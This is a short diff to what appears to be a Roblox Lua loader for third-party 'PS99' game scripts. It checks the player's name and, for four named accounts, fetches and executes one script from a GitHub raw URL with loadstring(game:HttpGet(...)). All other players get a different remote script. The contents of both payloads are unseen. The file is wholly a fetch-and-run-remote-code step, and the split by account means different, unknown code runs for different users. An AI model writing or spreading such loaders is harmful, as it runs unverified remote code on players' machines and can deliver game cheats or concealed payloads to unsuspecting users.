@@ -1,4 +1,12 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Monster69696/PS99/main/Backroom/Script1"))()
+if player.Name == "HammerStorm_999"
+or player.Name == "DoxepinsAlt2"
+or player.Name == "AkFrostyYT1"
+or player.Name == "AkFrostyYT2" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Monster69696/PS99/main/Backroom/Script1"))()
+else
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Monster69696/PS99/main/Backroom/Script"))()
+end
 
